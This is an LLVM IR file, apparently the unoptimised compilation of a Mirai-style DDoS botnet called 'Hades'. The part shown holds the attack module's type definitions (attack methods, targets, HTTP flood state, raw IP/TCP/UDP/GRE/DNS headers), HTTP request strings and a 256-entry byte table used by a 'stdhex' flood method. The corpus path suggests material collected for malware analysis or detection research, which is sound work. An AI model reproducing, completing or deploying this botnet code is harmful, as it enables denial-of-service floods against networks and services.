; ModuleID = 'host/ir_O0/Hades.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.grehdr = type { i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] [i32 3, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@attack_method_stdhex.satuur_thicc = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.1.16 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.2.17 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.3.18 = private unnamed_addr constant [2 x i8] c"\03\00", align 1
@.str.4.19 = private unnamed_addr constant [2 x i8] c"\04\00", align 1
@.str.5.20 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@.str.6.21 = private unnamed_addr constant [2 x i8] c"\06\00", align 1
@.str.7.22 = private unnamed_addr constant [2 x i8] c"\07\00", align 1
@.str.8.23 = private unnamed_addr constant [2 x i8] c"\08\00", align 1
@.str.9.24 = private unnamed_addr constant [2 x i8] c"\09\00", align 1
@.str.10.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11.26 = private unnamed_addr constant [2 x i8] c"\0B\00", align 1
@.str.12.27 = private unnamed_addr constant [2 x i8] c"\0C\00", align 1
@.str.13.28 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.14.29 = private unnamed_addr constant [2 x i8] c"\0E\00", align 1
@.str.15.30 = private unnamed_addr constant [2 x i8] c"\0F\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\12\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\14\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\15\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"\16\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\17\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\18\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\19\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"\1A\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"\1B\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"\1C\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"\1E\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"\1F\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] c"%\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.39 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"(\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c")\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"+\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.50 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.51 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.54 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.56 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.58 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c"<\00", align 1
@.str.61 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.62 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"@\00", align 1
